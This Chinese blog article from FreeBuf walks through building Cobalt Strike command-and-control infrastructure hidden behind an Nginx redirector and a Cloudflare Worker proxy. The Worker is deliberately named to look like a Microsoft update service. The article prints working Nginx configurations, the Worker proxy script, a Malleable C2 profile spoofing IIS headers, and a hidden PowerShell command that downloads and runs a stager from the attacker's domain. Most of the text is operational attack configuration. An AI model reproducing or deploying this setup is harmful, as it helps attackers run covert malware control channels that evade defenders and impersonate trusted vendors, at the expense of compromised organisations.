##  0x00 前言

 **由于Cloudflare会检查HTTPs请求中的SNI和Host字段能否对应上，所以在Cloudflare利用Domain
fronting几乎是不可能的，不过@digininja的这篇[文章](https://digi.ninja/blog/cloudflare_example.php)好像是测试了Cloudflare暂时还不会检查ESNI，有兴趣的可以试试用这个方法。至于这个算不是算是Domain
fronting，可见[@digininja](https://twitter.com/digininja)和[@grittygrease](https://twitter.com/grittygrease)之间的几番[交流](https://twitter.com/grittygrease/status/1097978655379140608)。**

##  0x01 准备工作

两台VPS服务器，一个域名

先画一下C2基础设施的构造：

![](https://image.3001.net/images/20200405/1586092419_5e89d983d5172.png!small)

##  0x02 配置Team Server

为了达到比较好的OpSec，我这里使用iptable禁止任何外部地址访问Team
Server的端口50050，只能用VPN通过localhost访问C2服务器，同时禁止外部地址访问C2服务器的80端口和443端口（分别用作http
beacon和https beacon监听器），仅接受来自Nginx转向器的转发过来的请求。

启动Cobalt Strike Team Server：

![](https://image.3001.net/images/20200405/1586092448_5e89d9a029e78.png!small)

分别测试80，443，50050端口的可访问情况：

从Nginx转向器发起请求：

![](https://image.3001.net/images/20200405/1586092461_5e89d9ad848d0.png!small)

从本地发起请求：

![](https://image.3001.net/images/20200405/1586092470_5e89d9b6113d4.png!small)

##  0x03 Nginx 转向器

为了待会添加Cloudflare Worker的反向代理就把SSL证书也申请了，让Nginx能同时接受http beacon和https
beacon。因为team server启动的时候没有指定Malleable-C2-Profile，所以Cobalt
Strike生成的payload请求所带的user-agent是随机生成的。这里就先不通过user-agent来判断请求是否来自beacon载荷，仅做转发。

Nginx配置：

    
    
    server {
            listen 80;
            ...
            root /var/www/html;
            index index.html;
            server_name maytheforcebewithu.domainfronting.ml;
            location / {
                    try_files $uri $uri/ @c2;
            }
        　　location /a {
                    proxy_pass http://<c2_IP_address>:80;
                    proxy_redirect off;
                    proxy_ssl_verify off;
                    proxy_set_header Host $host;
                    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            }
            location @c2 {
                    proxy_pass http://<c2_IP_address>:80;
                    proxy_redirect off;
                    proxy_ssl_verify off;
                    proxy_set_header Host $host;
                    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            }
    }

先测试一下转发到9999端口：

    
    
    curl -I http://maytheforcebewithu.domainfronting.ml/x4Rt
    curl -I http://maytheforcebewithu.domainfronting.ml/a

第一个是proxy_pass
[https://localhost:9999](https://localhost:9999/);，第二个是proxy_pass
[https://localhost:9999](https://localhost:9999/);

结果：

![](https://image.3001.net/images/20200405/1586092478_5e89d9beecd94.png!small)

连接到Team Server测试下是否能正常投递载荷：

![](https://image.3001.net/images/20200405/1586092486_5e89d9c6a79c9.png!small)

先测试下能否访问/a：

![](https://image.3001.net/images/20200405/1586092493_5e89d9cd51abd.png!small)

Weblog接收到请求：

![](https://image.3001.net/images/20200405/1586092499_5e89d9d33751a.png!small)

虚拟机上测试上线：

    
    
    powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://maytheforcebewithu.domainfronting.ml/a'))"

![](https://image.3001.net/images/20200405/1586092509_5e89d9dd85c60.png!small)

![](https://image.3001.net/images/20200405/1586092516_5e89d9e4ca3bb.png!small)

能成功下载载荷并执行上线，但是Wireshark能观察到一次对Nginx转向器域名的DNS解析请求，以及beacon频繁与Nginx转向器通信的可疑http流量。

##  0x04 添加Cloudflare Worker

Cloudflare必须要用户有在Cloudflare添加域名，才能够使用它所提供的Worker服务，至少我这个新注册的Cloudflare帐号时是添加了这个测试使用的域名以后才能继续。

###  创建Worker

Worker的创建千万要注意这个取的名字会出现在这里 xxxxxxxx.<Worker的名字>.worker.dev，而且不能再次更改了，只有一次机会。

![](https://image.3001.net/images/20200405/1586092534_5e89d9f6ef81e.png!small)

注册一个名为microsoftupdate的Worker，那么该Worker得到的子域名就是：microsoftupdate.worker.dev

![](https://image.3001.net/images/20200405/1586092552_5e89da08c65cb.png!small)

创建一个Worker script：

![](https://image.3001.net/images/20200405/1586092560_5e89da1046f87.png!small)

写入转发请求的js脚本，并设置一个四级域名保存并部署：

![](https://image.3001.net/images/20200405/1586093451_5e89dd8b586fd.png!small)

    
    
    const upstream = 'maytheforcebewithu.domainfronting.ml';
    const https = true;
    const replace_dict = {
        '$upstream': '$custom_domain',
        '': ''
    };
    addEventListener('fetch', event => {
        event.respondWith(fetchAndApply(event.request));
    });
    async function fetchAndApply(request) {
        const user_agent = request.headers.get('user-agent');
        let response = null;
        let url = new URL(request.url);
        let url_host = url.host;
        if (https == true) {
          url.protocol = 'https:';
        } else {
          url.protocol = 'http:';
        }
        url.host = upstream;
        let method = request.method;
        let request_headers = request.headers;
        let new_request_headers = new Headers(request_headers);
        new_request_headers.set('Host', upstream);
        new_request_headers.set('Referer', url.href);
        let original_response = await fetch(url.href, {
            method: method,
            headers: new_request_headers
        })
        let original_response_clone = original_response.clone();
        let original_text = null;
        let response_headers = original_response.headers;
        let new_response_headers = new Headers(response_headers);
        let status = original_response.status;
        new_response_headers.set('access-control-allow-origin', '*');
        new_response_headers.set('access-control-allow-credentials', true);
        new_response_headers.delete('content-security-policy');
        new_response_headers.delete('content-security-policy-report-only');
        new_response_headers.delete('clear-site-data');
        const content_type = new_response_headers.get('content-type');
        if (content_type.includes('text/html') && content_type.includes('UTF-8')) {
            original_text = await replace_response_text(original_response_clone, upstream_domain, url_host);
        } else {
            original_text = original_response_clone.body;
        }
        response = new Response(original_text, {
            status,
            headers: new_response_headers
        });
        return response;
    }
    async function replace_response_text(response, upstream_domain, host_name) {
        let text = await response.text();
        var i, j;
        for (i in replace_dict) {
            j = replace_dict[i];
            if (i == '$upstream') {
                i = upstream_domain;
            } else if (i == '$custom_domain') {
                i = host_name;
            }
            if (j == '$upstream') {
                j = upstream_domain;
            } else if (j == '$custom_domain') {
                j = host_name;
            }
            let re = new RegExp(i, 'g');
            text = text.replace(re, j);
        }
        return text;
    }

直接使用Cloudflare Worker提供的debug工具测试：

![](https://image.3001.net/images/20200405/1586092570_5e89da1add55a.png!small)

测试/a路径：

![](https://image.3001.net/images/20200405/1586092580_5e89da24cda4c.png!small)

###  添加Malleable-C2-Profile

这次为Team Server加上Malleable-C2-Profile，将Host都更改为Cloudflare分配到的子域名，更改User-Agent为Mozilla/5.0 (MSIE 9.0; Windows NT 6.1; EN_GB)，同时也为http-stager也添加上上述user-agent请求头。

    
    
    http-stager {
        client {
            header "Host" "bing-settings-data.microsoftupdate.workers.dev";
            header "User-Agent" "Mozilla/5.0 (MSIE 9.0; Windows NT 6.1; EN_GB)";
        }
        server {
            header "Cache-Control" "no-cache, no-store, must-revalidate";
            header "Content-Encoding" "br";
            header "Content-Type" "text/html; charset=utf-8";
            header "Vary" "Accept-Encoding";
            header "Server" "Microsoft-IIS/8.5";
            header "Connection" "close";
        }
    }

![](https://image.3001.net/images/20200405/1586092591_5e89da2f2ff6c.png!small)

更新Nginx配置：

    
    
    server {
            listen 80;
            ...
            root /var/www/html;
            index index.html;
            server_name maytheforcebewithu.domainfronting.ml;
            location / {
                    try_files $uri $uri/ @c2;
            }
        　　# for staging request
        　　location /a {
                    proxy_pass http://<c2_IP_address>:80;
                    proxy_redirect off;
                    proxy_ssl_verify off;
                    proxy_set_header Host $host;
                    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            }
            location @c2 {
                if ($http_user_agent = "Mozilla/5.0 (MSIE 9.0; Windows NT 6.1; EN_GB)") {
                            proxy_pass http://<c2_IP_address>:80;
            }
                    proxy_redirect off;
                    proxy_ssl_verify off;
                    proxy_set_header Host $host;
                    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            }
    }

由于Cobalt Strike默认的脚本投递路径就是/a，所以这里指定了/a转发给C2服务器，不然powershell没法下载到载荷。

编辑监听器，将Host改为Cloudflare Worker子域名：

![](https://image.3001.net/images/20200405/1586092600_5e89da389f221.png!small)

Attack-> Web Drive-by -> Scripted Web Delivery，将Host更改成Cloudflare Worker子域名：

![](https://image.3001.net/images/20200405/1586092607_5e89da3fb6bc5.png!small)

下载并执行载荷：

    
    
    powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://bing-settings-data.microsoftupdate.workers.dev/a'))"

Web log：

![](https://image.3001.net/images/20200405/1586092613_5e89da4568b46.png!small)

执行命令：

![](https://image.3001.net/images/20200405/1586092616_5e89da48eadef.png!small)

Wireshark：

![](https://image.3001.net/images/20200405/1586092625_5e89da5181656.png!small)

Stager发出的Get请求：

![](https://image.3001.net/images/20200405/1586092634_5e89da5a3c7df.png!small)

此时beacon通信的IP均是Cloudflare Worker的edge server其实也就是CDN节点，在Security
Trails里能搜到许多与该ip关联的[域名](https://securitytrails.com/list/ip/104.18.61.198)。不足之处是beacon通讯全是加密的http请求，噪音非常大，由于我的Cobalt
Strike没法启用ssl投递载荷，就没有测试使用https的beacon通信了。如果改用https，Wireshark抓包仅能在下载第一阶段载荷观察到一次对bing-settings-data.microsoftupdate.workers.dev的解析请求，以后的通信就都是发生在受害者与Cloudflare之间的TLS了，更加的隐蔽。理想状态下，应该有第三台专门用于投递载荷的机器，在投递完成后即可撤出。此外，由于Cloudflare的节点ip都是公开的，所以可以爬取所有Cloudflare节点ip后让Nginx转发器仅接受来自Cloudflare节点转发过来的请求，从而降低搜索引擎抓取并记录到nginx转发器指纹的风险。

##  参考

> <https://digi.ninja/blog/cloudflare_example.php>
>
> <https://github.com/Siujoeng-Lau/Workers-Proxy>

***本文作者：无业废物ksakf，转载请注明来自FreeBuf.COM**

